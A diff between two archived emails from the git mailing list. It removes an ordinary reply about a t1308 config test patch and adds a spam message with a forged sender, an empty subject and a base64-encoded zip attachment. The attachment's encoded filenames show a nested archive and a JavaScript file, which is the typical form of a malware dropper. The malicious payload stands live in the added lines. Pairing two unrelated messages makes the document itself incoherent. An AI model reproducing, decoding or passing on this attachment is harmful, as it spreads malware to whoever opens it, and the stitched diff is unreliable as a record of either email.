@@ -1,112 +1,90 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: **
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-2.7 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,
-	T_RP_MATCHES_RCVD shortcircuit=no autolearn=no autolearn_force=no
-	version=3.4.0
+X-Spam-Status: No, score=2.4 required=3.0 tests=BAYES_40,
+	FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,HEADER_FROM_DIFFERENT_DOMAINS,
+	RCVD_IN_DNSWL_HI,T_RP_MATCHES_RCVD,ZIPFILE shortcircuit=no autolearn=no
+	autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 864311FACB
-	for <e@80x24.org>; Wed,  7 Jun 2017 18:15:59 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 00F5C1FACB
+	for <e@80x24.org>; Wed,  7 Jun 2017 18:23:22 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1751856AbdFGSP4 (ORCPT <rfc822;e@80x24.org>);
-        Wed, 7 Jun 2017 14:15:56 -0400
-Received: from mail-pf0-f181.google.com ([209.85.192.181]:35879 "EHLO
-        mail-pf0-f181.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751795AbdFGSP4 (ORCPT <rfc822;git@vger.kernel.org>);
-        Wed, 7 Jun 2017 14:15:56 -0400
-Received: by mail-pf0-f181.google.com with SMTP id x63so8329822pff.3
-        for <git@vger.kernel.org>; Wed, 07 Jun 2017 11:15:55 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20161025;
-        h=date:from:to:cc:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to:user-agent;
-        bh=dqcChDBD5G0ALsiawtE/rJ4TJ980zozVsOCAGA26AkU=;
-        b=orbSB/uzGlmDLi3tpZPEdkkJSB1UJmp74ipOVi+RyvnVGw4ON7YiM6wO8og7BttBwJ
-         5DDvwW37nHAhCC4RJKoHqS2MRC/XP+rlyKf+aKoIqgsq/10ifkOxoIo/iXpU9yLHwmDO
-         OmQXgtJB2oK3ADAaS1cYARrMgxj2mGP/DRBrdms4t/7xNZkrltfMSWWlDNca/jbX35nH
-         z4GXgz5N6XnTup51gPYM41z8aKQNC6C8CJj12JfRCGpGryn89oAprY9Cw4ZWRD4QiUrZ
-         2z6j/dLW541t5eU7kq2hUWjMMC7nj9EGdDBFaNb9jbrQuIYXHX7ypbW6u7fAUfp1OYPG
-         6cFQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:date:from:to:cc:subject:message-id:references
-         :mime-version:content-disposition:in-reply-to:user-agent;
-        bh=dqcChDBD5G0ALsiawtE/rJ4TJ980zozVsOCAGA26AkU=;
-        b=qMM5hO2NSnvbhTuMJEaVKULpl9j0+wTMfyTxBZp8kWvl+We8bYi3GZUrgvrv2EjUxx
-         ASiHqbDXlqnXEKMAsOL8TrtSnBXBlBmxfg2uJJi5lZ5jJj8/EpW6MGvowy3C9h2yPahg
-         JnXYlitS500PAJz1DI9dhPXGs27xRM7QmRp2RW+mVSL/XmMvkK3fh1GoI1cy2lHgGWjP
-         oeOB55oQKje9pB/6YS5cqXhDxQn7Ob/R9qgH337q9P/D/zoz5ZEeL02IyNa3xS85aatv
-         2nFOVl+eBDtxlb8OXcxhAIT575wDc5JDN3SYf8TWwka+BaZvnI4rfYc4HRkrJX/U/j2I
-         9P+g==
-X-Gm-Message-State: AODbwcCoQUR+j+1ISHb4JkjG7IjPceYrXS83v7ELo9oYD27D4oLH5EjZ
-        lou1fEYMOWsyXHaM
-X-Received: by 10.99.121.13 with SMTP id u13mr33691976pgc.147.1496859355249;
-        Wed, 07 Jun 2017 11:15:55 -0700 (PDT)
-Received: from google.com ([2620:0:100e:422:793b:8a31:813b:ceb2])
-        by smtp.gmail.com with ESMTPSA id h7sm4862285pfc.97.2017.06.07.11.15.53
-        (version=TLS1_2 cipher=AES128-SHA bits=128/128);
-        Wed, 07 Jun 2017 11:15:54 -0700 (PDT)
-Date:   Wed, 7 Jun 2017 11:15:53 -0700
-From:   Brandon Williams <bmwill@google.com>
-To:     Johannes Schindelin <johannes.schindelin@gmx.de>
-Cc:     git@vger.kernel.org, Junio C Hamano <gitster@pobox.com>
-Subject: Re: [PATCH 5/9] t1308: relax the test verifying that empty alias
- values are disallowed
-Message-ID: <20170607181553.GE110638@google.com>
-References: <cover.1496851544.git.johannes.schindelin@gmx.de>
- <3325827e66b1a9e693f81e8aa4cae44f41dfdc25.1496851544.git.johannes.schindelin@gmx.de>
+        id S1751795AbdFGSXO (ORCPT <rfc822;e@80x24.org>);
+        Wed, 7 Jun 2017 14:23:14 -0400
+Received: from 188.141.1.37.interra.ru ([37.1.141.188]:56275 "HELO interra.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751787AbdFGSXO (ORCPT <rfc822;git@vger.kernel.org>);
+        Wed, 7 Jun 2017 14:23:14 -0400
+X-Greylist: delayed 300 seconds by postgrey-1.27 at vger.kernel.org; Wed, 07 Jun 2017 14:23:13 EDT
+Content-Type: application/zip; name="5342751861391.zip"
+Date:   Wed, 07 Jun 2017 18:23:10 -0000
+Subject: 
+Importance: High
+Message-ID: <149685979017.29695.11815323336489137393@interra.ru>
+Content-Disposition: attachment
+From:   <mrb132@aol.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <3325827e66b1a9e693f81e8aa4cae44f41dfdc25.1496851544.git.johannes.schindelin@gmx.de>
-User-Agent: Mutt/1.5.21 (2010-09-15)
+To:     <git@vger.kernel.org>
+Content-Transfer-Encoding: base64
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On 06/07, Johannes Schindelin wrote:
-> We are about to change the way aliases are expanded, to use the early
-> config machinery.
-> 
-> This machinery reports errors in a slightly different manner than the
-> cached config machinery.
-
-Not a comment on the patch but just a genuine question: Is there any
-reason why they complain in a different way?  Doesn't it make sense for
-the errors to be reported consistently?
-
-> 
-> Let's not get hung up by the precise wording of the message mentioning
-> the lin number. It is really sufficient to verify that all the relevant
-> information is given to the user.
-> 
-> Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>
-> ---
->  t/t1308-config-set.sh | 4 +++-
->  1 file changed, 3 insertions(+), 1 deletion(-)
-> 
-> diff --git a/t/t1308-config-set.sh b/t/t1308-config-set.sh
-> index ff50960ccae..69a0aa56d6d 100755
-> --- a/t/t1308-config-set.sh
-> +++ b/t/t1308-config-set.sh
-> @@ -215,7 +215,9 @@ test_expect_success 'check line errors for malformed values' '
->  		br
->  	EOF
->  	test_expect_code 128 git br 2>result &&
-> -	test_i18ngrep "fatal: .*alias\.br.*\.git/config.*line 2" result
-> +	test_i18ngrep "missing value for .alias\.br" result &&
-> +	test_i18ngrep "fatal: .*\.git/config" result &&
-> +	test_i18ngrep "fatal: .*line 2" result
->  '
->  
->  test_expect_success 'error on modifying repo config without repo' '
-> -- 
-> 2.13.0.windows.1.460.g13f583bedb5
-> 
-> 
-
--- 
-Brandon Williams
+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
+AAAAAAEAAQBOAAAA7QsAAAAA
